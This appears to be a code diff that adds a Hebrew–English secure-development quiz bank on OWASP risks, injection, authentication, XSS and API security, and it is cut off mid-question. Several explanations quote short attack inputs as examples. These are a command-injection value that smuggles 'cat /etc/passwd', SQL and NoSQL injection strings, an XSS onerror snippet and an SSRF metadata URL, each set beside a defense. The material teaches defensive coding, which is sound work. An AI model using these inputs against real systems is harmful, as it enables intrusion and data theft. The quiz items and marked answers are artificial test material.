@@ -9650,6 +9650,825 @@ export const quizBank = {
         "Just a pie chart\nwith vulnerability percentages"
       ]
     }
+  ],
+
+  // ===== SECURE DEV (701-708) =====
+
+  701: [
+    {
+      q: "\u200Fמהו הסיכון מספר 1 ברשימת OWASP Top 10 (2021)?",
+      correct: "\u200FBroken Access Control — כשמשתמשים מבצעים פעולות מחוץ להרשאותיהם",
+      choices: [
+        "\u200FBroken Access Control — כשמשתמשים מבצעים פעולות מחוץ להרשאותיהם",
+        "\u200FSQL Injection — הזרקת פקודות SQL",
+        "\u200FCryptographic Failures — הצפנה חלשה",
+        "\u200FCross-Site Scripting — הזרקת JavaScript"
+      ],
+      explanation: "\u200FBroken Access Control עלה למקום 1 בגרסת 2021. הוא כולל IDOR, privilege escalation, ו-missing function level access control. ההגנה: בדיקת הרשאות בצד שרת בכל endpoint.",
+      explanationEn: "Broken Access Control rose to #1 in the 2021 edition. It includes IDOR, privilege escalation, and missing function level access control. Defense: server-side authorization checks on every endpoint.",
+      qEn: "What is the #1 risk in the OWASP Top 10 (2021)?",
+      correctEn: "Broken Access Control — when users perform actions outside their permissions",
+      choicesEn: [
+        "Broken Access Control — when users perform actions outside their permissions",
+        "SQL Injection — injecting SQL commands",
+        "Cryptographic Failures — weak encryption",
+        "Cross-Site Scripting — injecting JavaScript"
+      ]
+    },
+    {
+      q: "\u200Fמהו IDOR ואיך הוא קשור ל-Broken Access Control?",
+      correct: "\u200Fשינוי מזהה (ID) ב-URL כדי לגשת למשאב של משתמש אחר, כי השרת לא מוודא בעלות",
+      choices: [
+        "\u200Fשינוי מזהה (ID) ב-URL כדי לגשת למשאב של משתמש אחר, כי השרת לא מוודא בעלות",
+        "\u200Fהזרקת קוד JavaScript לדף של משתמש אחר",
+        "\u200Fשימוש בסיסמה חלשה כדי לפרוץ לחשבון",
+        "\u200Fמתקפת DDoS שגורמת לשרת לקרוס"
+      ],
+      explanation: "\u200FIDOR (Insecure Direct Object Reference) קורה כשתוקף משנה /api/users/123 ל-/api/users/456 וניגש לנתונים של משתמש אחר. ההגנה: בדיקת בעלות בצד שרת.",
+      explanationEn: "IDOR (Insecure Direct Object Reference) happens when an attacker changes /api/users/123 to /api/users/456 and accesses another user's data. Defense: server-side ownership checks.",
+      qEn: "What is IDOR and how does it relate to Broken Access Control?",
+      correctEn: "Changing an ID in the URL to access another user's resource because the server doesn't verify ownership",
+      choicesEn: [
+        "Changing an ID in the URL to access another user's resource because the server doesn't verify ownership",
+        "Injecting JavaScript code into another user's page",
+        "Using a weak password to break into an account",
+        "A DDoS attack that crashes the server"
+      ]
+    },
+    {
+      q: "\u200Fמהי SSRF (A10) ואיך תוקף מנצל אותה?",
+      correct: "\u200Fהתוקף גורם לשרת לבצע בקשות HTTP למשאבים פנימיים שאינם נגישים מבחוץ",
+      choices: [
+        "\u200Fהתוקף גורם לשרת לבצע בקשות HTTP למשאבים פנימיים שאינם נגישים מבחוץ",
+        "\u200Fהתוקף שולח בקשות רבות כדי להפיל את השרת",
+        "\u200Fהתוקף מזריק SQL דרך טופס חיפוש",
+        "\u200Fהתוקף מחליף cookie של משתמש אחר"
+      ],
+      explanation: "\u200Fב-SSRF התוקף שולח URL כמו http://169.254.169.254/meta-data/ דרך ה-API, והשרת מבצע את הבקשה מתוך הרשת הפנימית. הגנה: allowlist של דומיינים, חסימת כתובות פנימיות.",
+      explanationEn: "In SSRF the attacker sends a URL like http://169.254.169.254/meta-data/ via the API, and the server makes the request from within the internal network. Defense: domain allowlist, block internal IPs.",
+      qEn: "What is SSRF (A10) and how does an attacker exploit it?",
+      correctEn: "The attacker causes the server to make HTTP requests to internal resources not accessible from outside",
+      choicesEn: [
+        "The attacker causes the server to make HTTP requests to internal resources not accessible from outside",
+        "The attacker sends many requests to crash the server",
+        "The attacker injects SQL through a search form",
+        "The attacker replaces another user's cookie"
+      ]
+    },
+    {
+      q: "\u200Fמה ההבדל בין A04 (Insecure Design) לבין באגים רגילים בקוד?",
+      correct: "\u200FInsecure Design הן בעיות תכנון ארכיטקטורי שלא ניתן לתקן עם patching — רק שינוי עיצוב",
+      choices: [
+        "\u200FInsecure Design הן בעיות תכנון ארכיטקטורי שלא ניתן לתקן עם patching — רק שינוי עיצוב",
+        "\u200Fאין הבדל — כל באג אבטחה הוא Insecure Design",
+        "\u200FInsecure Design מתייחס רק לעיצוב גרפי של הממשק",
+        "\u200FInsecure Design קורה רק בשפות תכנות ישנות"
+      ],
+      explanation: "\u200FA04 הוסף ב-2021 כקטגוריה נפרדת כי בעיות עיצוב שונות מבעיות מימוש. דוגמה: מערכת שאלות אבטחה שניתן לנחש — גם קוד מושלם לא יתקן תכנון לקוי. הפתרון: threat modeling.",
+      explanationEn: "A04 was added in 2021 as a separate category because design flaws differ from implementation bugs. Example: security questions that can be guessed — even perfect code won't fix a flawed design. Solution: threat modeling.",
+      qEn: "What is the difference between A04 (Insecure Design) and regular code bugs?",
+      correctEn: "Insecure Design are architectural planning issues that can't be fixed with patching — only design changes",
+      choicesEn: [
+        "Insecure Design are architectural planning issues that can't be fixed with patching — only design changes",
+        "No difference — every security bug is Insecure Design",
+        "Insecure Design refers only to UI/graphic design",
+        "Insecure Design only occurs in old programming languages"
+      ]
+    },
+    {
+      q: "\u200Fמה החשיבות של A09 (Security Logging and Monitoring Failures)?",
+      correct: "\u200Fללא לוגים תקינים, לא ניתן לזהות מתקפות — זמן זיהוי ממוצע עולה ל-200+ ימים",
+      choices: [
+        "\u200Fללא לוגים תקינים, לא ניתן לזהות מתקפות — זמן זיהוי ממוצע עולה ל-200+ ימים",
+        "\u200Fלוגים חשובים רק לביצועים, לא לאבטחה",
+        "\u200Fלוגים נדרשים רק כדי לעמוד בדרישות חוקיות",
+        "\u200Fלוגים חוסמים מתקפות באופן אוטומטי"
+      ],
+      explanation: "\u200FA09 לא מונע מתקפות ישירות, אבל בלי logging תקין אי אפשר לזהות פריצה, לחקור אותה, או לשפר הגנות. חובה לתעד: כניסות כושלות, שינויי הרשאות, גישה לנתונים רגישים.",
+      explanationEn: "A09 doesn't directly prevent attacks, but without proper logging you can't detect a breach, investigate it, or improve defenses. Must log: failed logins, permission changes, sensitive data access.",
+      qEn: "What is the importance of A09 (Security Logging and Monitoring Failures)?",
+      correctEn: "Without proper logs, attacks can't be detected — average detection time exceeds 200+ days",
+      choicesEn: [
+        "Without proper logs, attacks can't be detected — average detection time exceeds 200+ days",
+        "Logs are important only for performance, not security",
+        "Logs are required only for legal compliance",
+        "Logs automatically block attacks"
+      ]
+    }
+  ],
+  702: [
+    {
+      q: "\u200Fמהם שלושת סוגי ה-SQL Injection העיקריים?",
+      correct: "\u200FIn-band (Classic), Blind SQLi (Boolean/Time-based), ו-Out-of-band",
+      choices: [
+        "\u200FIn-band (Classic), Blind SQLi (Boolean/Time-based), ו-Out-of-band",
+        "\u200FGET injection, POST injection, ו-Cookie injection",
+        "\u200FClient-side, Server-side, ו-Database-side",
+        "\u200FSelect injection, Insert injection, ו-Delete injection"
+      ],
+      explanation: "\u200FIn-band — תוצאות מוחזרות ישירות. Blind — התוקף מסיק מידע מתגובות כן/לא או זמני תגובה. Out-of-band — תוצאות נשלחות לשרת חיצוני של התוקף.",
+      explanationEn: "In-band — results returned directly. Blind — attacker infers information from yes/no responses or response times. Out-of-band — results sent to attacker's external server.",
+      qEn: "What are the three main types of SQL Injection?",
+      correctEn: "In-band (Classic), Blind SQLi (Boolean/Time-based), and Out-of-band",
+      choicesEn: [
+        "In-band (Classic), Blind SQLi (Boolean/Time-based), and Out-of-band",
+        "GET injection, POST injection, and Cookie injection",
+        "Client-side, Server-side, and Database-side",
+        "Select injection, Insert injection, and Delete injection"
+      ]
+    },
+    {
+      q: "\u200Fמהו Parameterized Query ולמה הוא מונע SQL Injection?",
+      correct: "\u200Fמפריד בין קוד SQL לנתונים — הנתונים לעולם לא מתפרשים כפקודות",
+      choices: [
+        "\u200Fמפריד בין קוד SQL לנתונים — הנתונים לעולם לא מתפרשים כפקודות",
+        "\u200Fמצפין את כל השאילתות לפני שליחה ל-DB",
+        "\u200Fחוסם תווים מסוכנים כמו גרש ומקף",
+        "\u200Fמגביל את אורך הקלט ל-100 תווים"
+      ],
+      explanation: "\u200FParameterized Queries (Prepared Statements) שולחים את הנתונים בנפרד מהשאילתה. ה-DB יודע שהנתונים הם נתונים ולא פקודות, אז ' OR 1=1 -- מתפרש כטקסט רגיל.",
+      explanationEn: "Parameterized Queries (Prepared Statements) send data separately from the query. The DB knows the data is data, not commands, so ' OR 1=1 -- is treated as plain text.",
+      qEn: "What is a Parameterized Query and why does it prevent SQL Injection?",
+      correctEn: "Separates SQL code from data — data is never interpreted as commands",
+      choicesEn: [
+        "Separates SQL code from data — data is never interpreted as commands",
+        "Encrypts all queries before sending to DB",
+        "Blocks dangerous characters like quotes and dashes",
+        "Limits input length to 100 characters"
+      ]
+    },
+    {
+      q: "\u200Fלמה execFile בטוח יותר מ-exec ב-Node.js למניעת Command Injection?",
+      correct: "\u200Fexec מעביר מחרוזת ל-shell ומאפשר שרשור פקודות. execFile מפריד פקודה מארגומנטים ולא עובר דרך shell",
+      choices: [
+        "\u200Fexec מעביר מחרוזת ל-shell ומאפשר שרשור פקודות. execFile מפריד פקודה מארגומנטים ולא עובר דרך shell",
+        "\u200FexecFile מהיר יותר ולכן חוסם מתקפות",
+        "\u200FexecFile מצפין את הפלט אוטומטית",
+        "\u200Fאין הבדל אבטחתי — שניהם בטוחים באותה מידה"
+      ],
+      explanation: "\u200Fexec('ping ' + userInput) עם input כמו 'google.com; cat /etc/passwd' יריץ שתי פקודות. execFile('ping', ['-c','1', host]) מתייחס לכל ארגומנט כטקסט ולא כפקודה.",
+      explanationEn: "exec('ping ' + userInput) with input like 'google.com; cat /etc/passwd' runs two commands. execFile('ping', ['-c','1', host]) treats each argument as text, not a command.",
+      qEn: "Why is execFile safer than exec in Node.js for preventing Command Injection?",
+      correctEn: "exec passes a string to the shell allowing command chaining. execFile separates command from arguments and doesn't go through the shell",
+      choicesEn: [
+        "exec passes a string to the shell allowing command chaining. execFile separates command from arguments and doesn't go through the shell",
+        "execFile is faster and therefore blocks attacks",
+        "execFile encrypts output automatically",
+        "No security difference — both are equally safe"
+      ]
+    },
+    {
+      q: "\u200Fאיך עובדת מתקפת NoSQL Injection על MongoDB?",
+      correct: "\u200Fהתוקף שולח אובייקט JSON עם אופרטורים כמו $ne במקום מחרוזת, ומשנה את לוגיקת השאילתה",
+      choices: [
+        "\u200Fהתוקף שולח אובייקט JSON עם אופרטורים כמו $ne במקום מחרוזת, ומשנה את לוגיקת השאילתה",
+        "\u200Fהתוקף מזריק פקודות SQL רגילות דרך MongoDB",
+        "\u200Fהתוקף מוחק את כל ה-collections דרך ממשק האדמין",
+        "\u200FNoSQL לא פגיע להזרקות כלל"
+      ],
+      explanation: "\u200Fבמקום לשלוח password: 'abc', התוקף שולח password: {$ne: ''} — שזה אומר 'password שונה מריק' = תמיד true. הגנה: בדיקת typeof על כל קלט.",
+      explanationEn: "Instead of sending password: 'abc', the attacker sends password: {$ne: ''} — meaning 'password not equal to empty' = always true. Defense: typeof checking on all input.",
+      qEn: "How does a NoSQL Injection attack on MongoDB work?",
+      correctEn: "The attacker sends a JSON object with operators like $ne instead of a string, changing the query logic",
+      choicesEn: [
+        "The attacker sends a JSON object with operators like $ne instead of a string, changing the query logic",
+        "The attacker injects regular SQL commands through MongoDB",
+        "The attacker deletes all collections through the admin interface",
+        "NoSQL is not vulnerable to injections at all"
+      ]
+    },
+    {
+      q: "\u200Fמהו Time-based Blind SQL Injection?",
+      correct: "\u200Fהתוקף משתמש ב-SLEEP() ומסיק אם תנאי נכון לפי זמן התגובה של השרת",
+      choices: [
+        "\u200Fהתוקף משתמש ב-SLEEP() ומסיק אם תנאי נכון לפי זמן התגובה של השרת",
+        "\u200Fמתקפה שמתבצעת רק בזמנים מסוימים ביום",
+        "\u200Fמתקפה שלוקחת הרבה זמן להשלמה ולכן נקראת 'time-based'",
+        "\u200Fמתקפה שמשנה את השעה בשרת ה-DB"
+      ],
+      explanation: "\u200Fהתוקף שולח: ' AND IF(1=1, SLEEP(5), 0) -- . אם התשובה מתעכבת 5 שניות, הביטוי נכון. כך ניתן לחלץ מידע bit-by-bit. כלי כמו sqlmap מאפשר אוטומציה מלאה.",
+      explanationEn: "The attacker sends: ' AND IF(1=1, SLEEP(5), 0) --. If the response is delayed 5 seconds, the expression is true. This allows extracting information bit-by-bit. Tools like sqlmap automate this.",
+      qEn: "What is Time-based Blind SQL Injection?",
+      correctEn: "The attacker uses SLEEP() and infers whether a condition is true based on the server's response time",
+      choicesEn: [
+        "The attacker uses SLEEP() and infers whether a condition is true based on the server's response time",
+        "An attack that only occurs at certain times of day",
+        "An attack that takes a long time to complete hence called 'time-based'",
+        "An attack that changes the time on the DB server"
+      ]
+    }
+  ],
+  703: [
+    {
+      q: "\u200Fלמה bcrypt עדיף על SHA-256 לאחסון סיסמאות?",
+      correct: "\u200Fbcrypt איטי בכוונה (cost factor מתכוונן) — GPU יכול לחשב מיליארדי SHA-256 בשנייה אבל רק אלפי bcrypt",
+      choices: [
+        "\u200Fbcrypt איטי בכוונה (cost factor מתכוונן) — GPU יכול לחשב מיליארדי SHA-256 בשנייה אבל רק אלפי bcrypt",
+        "\u200Fbcrypt מייצר hash קצר יותר שתופס פחות מקום ב-DB",
+        "\u200FSHA-256 הוא אלגוריתם ישן שכבר נפרץ",
+        "\u200Fbcrypt לא צריך salt בניגוד ל-SHA-256"
+      ],
+      explanation: "\u200Fbcrypt מתוכנן להיות איטי — cost factor קובע כמה סיבובי חישוב. ככל שחומרה מתחזקת, מגדילים את ה-cost. SHA-256 מהיר מדי ופגיע ל-brute force. bcrypt גם כולל salt מובנה.",
+      explanationEn: "bcrypt is designed to be slow — cost factor determines computation rounds. As hardware improves, increase the cost. SHA-256 is too fast and vulnerable to brute force. bcrypt also includes built-in salt.",
+      qEn: "Why is bcrypt preferred over SHA-256 for storing passwords?",
+      correctEn: "bcrypt is intentionally slow (adjustable cost factor) — GPUs can compute billions of SHA-256/sec but only thousands of bcrypt",
+      choicesEn: [
+        "bcrypt is intentionally slow (adjustable cost factor) — GPUs can compute billions of SHA-256/sec but only thousands of bcrypt",
+        "bcrypt generates a shorter hash that takes less DB space",
+        "SHA-256 is an old algorithm that has been cracked",
+        "bcrypt doesn't need salt unlike SHA-256"
+      ]
+    },
+    {
+      q: "\u200Fמהם שלושת גורמי הזיהוי ב-MFA?",
+      correct: "\u200Fמשהו שאתה יודע (סיסמה), משהו שיש לך (טלפון/מפתח), משהו שאתה (ביומטרי)",
+      choices: [
+        "\u200Fמשהו שאתה יודע (סיסמה), משהו שיש לך (טלפון/מפתח), משהו שאתה (ביומטרי)",
+        "\u200Fסיסמה, מייל, ושם משתמש",
+        "\u200Fסיסמה ראשית, סיסמה משנית, וקוד PIN",
+        "\u200Fזיהוי פנים, טביעת אצבע, וזיהוי קול"
+      ],
+      explanation: "\u200FMFA דורש לפחות שני גורמים שונים: Something you know (סיסמה), Something you have (טלפון, YubiKey), Something you are (טביעת אצבע). שני סוגי סיסמאות = עדיין גורם אחד.",
+      explanationEn: "MFA requires at least two different factors: Something you know (password), Something you have (phone, YubiKey), Something you are (fingerprint). Two passwords = still one factor.",
+      qEn: "What are the three authentication factors in MFA?",
+      correctEn: "Something you know (password), something you have (phone/key), something you are (biometric)",
+      choicesEn: [
+        "Something you know (password), something you have (phone/key), something you are (biometric)",
+        "Password, email, and username",
+        "Primary password, secondary password, and PIN code",
+        "Face recognition, fingerprint, and voice recognition"
+      ]
+    },
+    {
+      q: "\u200Fלמה SMS OTP נחשב לשיטת MFA חלשה?",
+      correct: "\u200Fפגיע ל-SIM Swapping — תוקף משכנע את חברת הסלולר להעביר את המספר לסים שלו",
+      choices: [
+        "\u200Fפגיע ל-SIM Swapping — תוקף משכנע את חברת הסלולר להעביר את המספר לסים שלו",
+        "\u200Fכי קודי SMS תמיד מכילים רק 4 ספרות",
+        "\u200Fכי SMS לא מוצפן ולכן התוקף יכול לפרוץ לשרת ה-SMS",
+        "\u200Fכי SMS דורש חיבור אינטרנט שלא תמיד זמין"
+      ],
+      explanation: "\u200FSIM Swapping היא מתקפת הנדסה חברתית. התוקף מתקשר לחברת הסלולר ומעביר את מספר הקורבן לסים חדש. כל ה-OTP מגיעים לתוקף. TOTP ו-FIDO2 לא תלויים בחברת סלולר.",
+      explanationEn: "SIM Swapping is a social engineering attack. The attacker calls the carrier and transfers the victim's number to a new SIM. All OTPs go to the attacker. TOTP and FIDO2 don't depend on carriers.",
+      qEn: "Why is SMS OTP considered a weak MFA method?",
+      correctEn: "Vulnerable to SIM Swapping — attacker convinces the carrier to transfer the number to their SIM",
+      choicesEn: [
+        "Vulnerable to SIM Swapping — attacker convinces the carrier to transfer the number to their SIM",
+        "Because SMS codes always contain only 4 digits",
+        "Because SMS is not encrypted so the attacker can hack the SMS server",
+        "Because SMS requires internet which is not always available"
+      ]
+    },
+    {
+      q: "\u200Fמהם ה-cookie flags החשובים לאבטחת sessions?",
+      correct: "\u200FHttpOnly (אין גישת JS), Secure (HTTPS בלבד), SameSite (הגנת CSRF)",
+      choices: [
+        "\u200FHttpOnly (אין גישת JS), Secure (HTTPS בלבד), SameSite (הגנת CSRF)",
+        "\u200FPublic, Private, ו-Protected",
+        "\u200FReadable, Writable, ו-Executable",
+        "\u200FPersistent, Session, ו-Temporary"
+      ],
+      explanation: "\u200FHttpOnly מונע גישה ל-cookie מ-JavaScript (מגן מ-XSS). Secure שולח cookie רק דרך HTTPS. SameSite מגביל שליחת cookie מדומיינים חיצוניים (מגן מ-CSRF).",
+      explanationEn: "HttpOnly prevents JavaScript access to cookie (protects from XSS). Secure sends cookie only over HTTPS. SameSite restricts cookie sending from external domains (protects from CSRF).",
+      qEn: "What are the important cookie flags for session security?",
+      correctEn: "HttpOnly (no JS access), Secure (HTTPS only), SameSite (CSRF protection)",
+      choicesEn: [
+        "HttpOnly (no JS access), Secure (HTTPS only), SameSite (CSRF protection)",
+        "Public, Private, and Protected",
+        "Readable, Writable, and Executable",
+        "Persistent, Session, and Temporary"
+      ]
+    },
+    {
+      q: "\u200Fלמה חשוב להחזיר הודעת שגיאה גנרית בעמוד login?",
+      correct: "\u200Fהודעה ספציפית כמו 'User not found' מאפשרת user enumeration — גילוי אילו חשבונות קיימים",
+      choices: [
+        "\u200Fהודעה ספציפית כמו 'User not found' מאפשרת user enumeration — גילוי אילו חשבונות קיימים",
+        "\u200Fכי הודעות גנריות מהירות יותר לרנדור",
+        "\u200Fכי זה דרישה חוקית בלבד, בלי ערך אבטחתי",
+        "\u200Fכדי לחסוך בעלויות תרגום לשפות שונות"
+      ],
+      explanation: "\u200Fהודעה כמו 'User not found' מגלה שהמייל לא רשום. עם הודעה 'Invalid email or password' התוקף לא יודע אם המייל קיים, מה שמקשה על credential stuffing ו-brute force ממוקד.",
+      explanationEn: "A message like 'User not found' reveals the email isn't registered. With 'Invalid email or password' the attacker doesn't know if the email exists, making targeted credential stuffing and brute force harder.",
+      qEn: "Why is it important to return a generic error message on a login page?",
+      correctEn: "A specific message like 'User not found' enables user enumeration — discovering which accounts exist",
+      choicesEn: [
+        "A specific message like 'User not found' enables user enumeration — discovering which accounts exist",
+        "Because generic messages are faster to render",
+        "Because it's a legal requirement only, with no security value",
+        "To save on translation costs for different languages"
+      ]
+    }
+  ],
+  704: [
+    {
+      q: "\u200Fמהם שלושת סוגי XSS העיקריים?",
+      correct: "\u200FReflected (מה-URL), Stored (נשמר ב-DB), DOM-based (מבוצע בצד הלקוח)",
+      choices: [
+        "\u200FReflected (מה-URL), Stored (נשמר ב-DB), DOM-based (מבוצע בצד הלקוח)",
+        "\u200FClient XSS, Server XSS, ו-Network XSS",
+        "\u200FSimple XSS, Advanced XSS, ו-Expert XSS",
+        "\u200FGET XSS, POST XSS, ו-Cookie XSS"
+      ],
+      explanation: "\u200FReflected — הקוד מגיע מה-URL ומוחזר בתשובה. Stored — הקוד נשמר ב-DB ופוגע בכל מי שגולש. DOM-based — הקוד מבוצע בדפדפן ישירות ללא מעורבות השרת.",
+      explanationEn: "Reflected — code comes from URL and is returned in response. Stored — code is saved in DB and affects everyone who browses. DOM-based — code executes in browser directly without server involvement.",
+      qEn: "What are the three main types of XSS?",
+      correctEn: "Reflected (from URL), Stored (saved in DB), DOM-based (executed client-side)",
+      choicesEn: [
+        "Reflected (from URL), Stored (saved in DB), DOM-based (executed client-side)",
+        "Client XSS, Server XSS, and Network XSS",
+        "Simple XSS, Advanced XSS, and Expert XSS",
+        "GET XSS, POST XSS, and Cookie XSS"
+      ]
+    },
+    {
+      q: "\u200Fלמה Stored XSS מסוכן יותר מ-Reflected XSS?",
+      correct: "\u200Fנשמר ב-DB ופוגע בכל משתמש שגולש בדף, ללא צורך בקישור מיוחד",
+      choices: [
+        "\u200Fנשמר ב-DB ופוגע בכל משתמש שגולש בדף, ללא צורך בקישור מיוחד",
+        "\u200Fכי הוא עובד רק בדפדפנים ישנים ולכן קשה לזיהוי",
+        "\u200Fכי הוא מצפין את הנתונים ב-DB",
+        "\u200Fאין הבדל — שניהם באותה רמת סיכון"
+      ],
+      explanation: "\u200FReflected דורש שהקורבן ילחץ על קישור מיוחד. Stored מאוחסן ב-DB ומופעל אוטומטית בכל גלישה בדף — פוגע בהרבה יותר משתמשים וקשה יותר לזיהוי כי הקוד לא נראה ב-URL.",
+      explanationEn: "Reflected requires the victim to click a special link. Stored is saved in DB and activates automatically on every page view — affects more users and is harder to detect since the code isn't visible in the URL.",
+      qEn: "Why is Stored XSS more dangerous than Reflected XSS?",
+      correctEn: "Saved in DB and affects every user who browses the page, no special link needed",
+      choicesEn: [
+        "Saved in DB and affects every user who browses the page, no special link needed",
+        "Because it only works in old browsers making it harder to detect",
+        "Because it encrypts DB data",
+        "No difference — both are equally risky"
+      ]
+    },
+    {
+      q: "\u200Fמהו CSP (Content Security Policy) ואיך הוא מגן מ-XSS?",
+      correct: "\u200FHTTP header שמגדיר מאילו מקורות הדפדפן רשאי לטעון סקריפטים ומשאבים",
+      choices: [
+        "\u200FHTTP header שמגדיר מאילו מקורות הדפדפן רשאי לטעון סקריפטים ומשאבים",
+        "\u200Fפרוטוקול הצפנה שמחליף HTTPS",
+        "\u200Fתוסף דפדפן שחוסם פרסומות ו-XSS",
+        "\u200Fכלי סריקה שמוצא XSS בקוד מקור"
+      ],
+      explanation: "\u200FCSP מגביל מאיפה אפשר לטעון JS, CSS, תמונות וכו'. script-src 'self' אומר רק סקריפטים מהדומיין שלנו. גם אם תוקף מזריק script — הדפדפן חוסם אותו כי הוא לא ממקור מורשה.",
+      explanationEn: "CSP restricts where JS, CSS, images etc. can be loaded from. script-src 'self' means only scripts from our domain. Even if an attacker injects script — the browser blocks it as it's not from an allowed source.",
+      qEn: "What is CSP (Content Security Policy) and how does it protect against XSS?",
+      correctEn: "An HTTP header that defines which sources the browser may load scripts and resources from",
+      choicesEn: [
+        "An HTTP header that defines which sources the browser may load scripts and resources from",
+        "An encryption protocol replacing HTTPS",
+        "A browser extension that blocks ads and XSS",
+        "A scanning tool that finds XSS in source code"
+      ]
+    },
+    {
+      q: "\u200Fלמה innerHTML מסוכן ומה האלטרנטיבה הבטוחה?",
+      correct: "\u200FinnerHTML מפרש קלט כ-HTML ומאפשר הרצת קוד — האלטרנטיבה: textContent שמציג טקסט רגיל",
+      choices: [
+        "\u200FinnerHTML מפרש קלט כ-HTML ומאפשר הרצת קוד — האלטרנטיבה: textContent שמציג טקסט רגיל",
+        "\u200FinnerHTML איטי מדי — האלטרנטיבה: document.write",
+        "\u200FinnerHTML עובד רק ב-IE — האלטרנטיבה: outerHTML",
+        "\u200FinnerHTML לא תומך ב-Unicode — האלטרנטיבה: innerText"
+      ],
+      explanation: "\u200FinnerHTML מכניס HTML שמבוצע — כולל <img onerror=alert(1)>. textContent מתייחס לכל דבר כטקסט רגיל. ב-React, המקביל המסוכן הוא dangerouslySetInnerHTML.",
+      explanationEn: "innerHTML inserts HTML that gets executed — including <img onerror=alert(1)>. textContent treats everything as plain text. In React, the dangerous equivalent is dangerouslySetInnerHTML.",
+      qEn: "Why is innerHTML dangerous and what is the safe alternative?",
+      correctEn: "innerHTML interprets input as HTML allowing code execution — alternative: textContent which displays plain text",
+      choicesEn: [
+        "innerHTML interprets input as HTML allowing code execution — alternative: textContent which displays plain text",
+        "innerHTML is too slow — alternative: document.write",
+        "innerHTML only works in IE — alternative: outerHTML",
+        "innerHTML doesn't support Unicode — alternative: innerText"
+      ]
+    },
+    {
+      q: "\u200Fהאם React מגן לחלוטין מפני XSS?",
+      correct: "\u200Fלא — dangerouslySetInnerHTML, href עם javascript: protocol, ו-SSR יכולים ליצור פגיעויות",
+      choices: [
+        "\u200Fלא — dangerouslySetInnerHTML, href עם javascript: protocol, ו-SSR יכולים ליצור פגיעויות",
+        "\u200Fכן — React חוסם כל סוגי XSS באופן מלא",
+        "\u200Fלא — React בכלל לא מטפל ב-XSS, צריך ספריות חיצוניות",
+        "\u200Fכן — רק אם משתמשים בגרסה האחרונה"
+      ],
+      explanation: "\u200FReact מבצע encoding אוטומטי ב-JSX expressions (סוגריים מסולסלים), אבל חריגים: dangerouslySetInnerHTML מזריק HTML ישירות, href='javascript:...' מאפשר הרצת קוד, ו-SSR עם נתונים לא מסוננים.",
+      explanationEn: "React performs automatic encoding in JSX expressions (curly braces), but exceptions: dangerouslySetInnerHTML injects HTML directly, href='javascript:...' allows code execution, and SSR with unfiltered data.",
+      qEn: "Does React fully protect against XSS?",
+      correctEn: "No — dangerouslySetInnerHTML, href with javascript: protocol, and SSR can create vulnerabilities",
+      choicesEn: [
+        "No — dangerouslySetInnerHTML, href with javascript: protocol, and SSR can create vulnerabilities",
+        "Yes — React blocks all types of XSS completely",
+        "No — React doesn't handle XSS at all, external libraries are needed",
+        "Yes — only when using the latest version"
+      ]
+    }
+  ],
+  705: [
+    {
+      q: "\u200Fמהו BOLA ולמה הוא הסיכון מספר 1 ב-OWASP API Security?",
+      correct: "\u200Fגישה לאובייקטים של משתמשים אחרים דרך שינוי ID בבקשת API, בגלל חוסר בדיקת בעלות",
+      choices: [
+        "\u200Fגישה לאובייקטים של משתמשים אחרים דרך שינוי ID בבקשת API, בגלל חוסר בדיקת בעלות",
+        "\u200Fמתקפת DDoS על API endpoints",
+        "\u200Fשימוש ב-API ללא אימות כלל",
+        "\u200Fחשיפת תיעוד API לציבור"
+      ],
+      explanation: "\u200FBOLA (Broken Object Level Authorization) — תוקף משנה GET /api/orders/123 ל-/api/orders/456 ורואה הזמנה של משתמש אחר. ההגנה: בדיקת userId בכל שאילתה.",
+      explanationEn: "BOLA (Broken Object Level Authorization) — attacker changes GET /api/orders/123 to /api/orders/456 and sees another user's order. Defense: check userId in every query.",
+      qEn: "What is BOLA and why is it the #1 risk in OWASP API Security?",
+      correctEn: "Accessing other users' objects by changing the ID in API requests due to missing ownership checks",
+      choicesEn: [
+        "Accessing other users' objects by changing the ID in API requests due to missing ownership checks",
+        "DDoS attack on API endpoints",
+        "Using an API without any authentication",
+        "Exposing API documentation to the public"
+      ]
+    },
+    {
+      q: "\u200Fמה היתרון של Token Bucket על פני Fixed Window ל-rate limiting?",
+      correct: "\u200FFixed Window מאפשר burst כפול בגבול חלונות. Token Bucket מאפשר burst מבוקר תוך שמירה על קצב ממוצע",
+      choices: [
+        "\u200FFixed Window מאפשר burst כפול בגבול חלונות. Token Bucket מאפשר burst מבוקר תוך שמירה על קצב ממוצע",
+        "\u200FToken Bucket חוסם יותר בקשות ולכן בטוח יותר",
+        "\u200FFixed Window עובד רק עם IP, Token Bucket עובד עם user ID",
+        "\u200Fאין הבדל — שניהם עובדים אותו דבר"
+      ],
+      explanation: "\u200FFixed Window של 100/דקה: 100 בקשות בשנייה 59 + 100 בשנייה 0 של החלון הבא = 200 בקשות ב-2 שניות. Token Bucket מוסיף tokens בקצב קבוע ומאפשר burst רק כשיש tokens.",
+      explanationEn: "Fixed Window of 100/min: 100 requests at second 59 + 100 at second 0 of next window = 200 requests in 2 seconds. Token Bucket adds tokens at a constant rate and allows bursts only when tokens are available.",
+      qEn: "What is the advantage of Token Bucket over Fixed Window for rate limiting?",
+      correctEn: "Fixed Window allows double burst at window boundaries. Token Bucket allows controlled burst while maintaining average rate",
+      choicesEn: [
+        "Fixed Window allows double burst at window boundaries. Token Bucket allows controlled burst while maintaining average rate",
+        "Token Bucket blocks more requests so it's safer",
+        "Fixed Window only works with IP, Token Bucket works with user ID",
+        "No difference — both work the same way"
+      ]
+    },
+    {
+      q: "\u200Fלמה אחסון JWT ב-localStorage מסוכן?",
+      correct: "\u200FlocalStorage נגיש לכל JavaScript בדף — מתקפת XSS יכולה לגנוב את ה-token",
+      choices: [
+        "\u200FlocalStorage נגיש לכל JavaScript בדף — מתקפת XSS יכולה לגנוב את ה-token",
+        "\u200FlocalStorage מוגבל ל-5MB ו-JWT גדול מדי",
+        "\u200FlocalStorage נמחק כשסוגרים את הדפדפן",
+        "\u200FlocalStorage לא עובד ב-mobile browsers"
+      ],
+      explanation: "\u200Fכל JavaScript בדף יכול לקרוא localStorage. אם יש XSS, התוקף קורא את ה-JWT ושולח אותו לשרת שלו. האלטרנטיבה: HttpOnly cookie שלא נגיש ל-JS, עם הגנת SameSite מ-CSRF.",
+      explanationEn: "Any JavaScript on the page can read localStorage. If there's XSS, the attacker reads the JWT and sends it to their server. Alternative: HttpOnly cookie not accessible to JS, with SameSite CSRF protection.",
+      qEn: "Why is storing JWT in localStorage dangerous?",
+      correctEn: "localStorage is accessible to all JavaScript on the page — an XSS attack can steal the token",
+      choicesEn: [
